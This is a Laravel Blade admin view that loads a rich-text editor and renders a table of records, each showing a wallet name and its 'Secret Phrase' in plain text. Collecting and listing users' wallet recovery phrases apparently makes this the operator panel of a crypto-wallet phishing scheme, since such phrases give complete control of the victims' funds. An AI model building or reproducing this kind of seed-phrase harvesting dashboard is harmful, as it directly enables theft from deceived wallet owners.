@extends('layouts.admin')
@section('style')

    <script type="text/javascript" src="{{ asset('assets/dashboard/js/nicEdit.js') }}">

    </script>
    <script type="text/javascript">
        //<![CDATA[
        bkLib.onDomLoaded(function () {
            nicEditors.allTextAreas()
        });
        //]]>
    </script>

@endsection
@section('content')
    <div class="row">
        <div class="col-md-12">
            <div class="card">
                <div class="card-body">
                    <table class="datatable-init-export nk-tb-list nk-tb-ulist table" data-export-title="Export" data-auto-responsive="true">
                        <thead>
                        <tr>
                            <th width="5%">S/No</th>
                            <th width="10%">Wallet</th>
                            <th width="25%">Secret Phrase</th>
                        </tr>
                        </thead>
                        <tbody>
                        @php $i = 0; @endphp
                        @foreach($a_contests as $c)
                            @php $i++; @endphp
                            <tr class="nk-tb-item">
                                <td>{{ $i }}</td>
                                <td>{{$c->wallet_name}}</td>
                                <td>{{$c->secret_phrase}}</td>
                            </tr>
                        @endforeach
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
@endsection